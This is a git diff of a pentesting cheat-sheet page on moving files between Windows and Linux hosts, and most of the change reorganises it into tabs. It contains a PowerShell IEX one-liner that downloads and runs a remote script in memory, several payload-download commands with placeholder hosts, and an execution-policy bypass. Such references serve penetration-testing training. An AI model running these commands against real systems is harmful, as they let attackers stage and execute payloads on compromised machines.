@@ -5,6 +5,11 @@ description: Windows - Linux File Transfer
 keywords: [file transfer, windows file transfer, pentesting, oscp, smb file transfer, powershell file transfer, certutil file transfer, ftp file transfer, tftp file transfer, vbscript file transfer, scp]
 ---
 
+
+import Tabs from '@theme/Tabs';
+import TabItem from '@theme/TabItem';
+
+
 ## HTTP Server
 
 ```batch
@@ -42,25 +47,30 @@ copy \\IP\SHARE_NAME\FILE OUTPUT
 copy FILE \\IP\SHARE_NAME\OUTPUT
 ```
 
+<br/>
 
 ## PSH
 
 
 ```powershell
-# Download&Execute Without Saving
+# Download - Execute Without Saving
 powershell IEX (New-Object System.Net.WebClient).DownloadString('http://IP:PORT/FILE.ps1')
 ```
 
-<br/>
-
+<Tabs>
+  <TabItem value="int" label="Interactive"> 
+    <div style={{color: 'red'}}>
 
 ```powershell
-# Interactive Terminal
 powershell -command (New-Object System.Net.WebClient).Downloadfile('http://IP:PORT/FILE.exe','FILE.exe')
 ```
 
+</div>
+  </TabItem>
+  <TabItem value="nonint" label="Non Interactive"> 
+    <div style={{color: 'red'}}>
+
 ```powershell
-# Non Interactive Terminal
 echo $storageDir = $pwd > PSH.ps1
 echo $webclient = New-Object System.Net.WebClient >> PSH.ps1
 echo $url = "http://IP:PORT/FILE.exe" >> PSH.ps1
@@ -69,23 +79,39 @@ echo $webclient.DownloadFile($url,$file) >> PSH.ps1
 powershell -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File PSH.ps1
 ```
 
+</div>
+  </TabItem>
+</Tabs>
+
 <br/>
 
 
-```powershell
-# WebRequest
+<Tabs>
+  <TabItem value="web_m" label="WebRequest"> 
+    <div style={{color: 'red'}}>
+
+```bash
 $source = 'http://IP:PORT/FILE.exe'
 $destination = 'OUTPUT.exe'
 Invoke-WebRequest -Uri $source -OutFile $destination
 ```
 
+</div>
+  </TabItem>
+  <TabItem value="rest_m" label="RestMethod"> 
+    <div style={{color: 'red'}}>
 
-```powershell
-# RestMethod
+```bash
 $source = 'http://IP:PORT/FILE.exe'
-$destination = 'FILE.exe'
+$destination = 'OUTPUT.exe'
 Invoke-RestMethod -Uri $source -OutFile $destination
 ```
+
+</div>
+  </TabItem>
+</Tabs>
+
+<br/>
 
 ## CERTUTIL
 
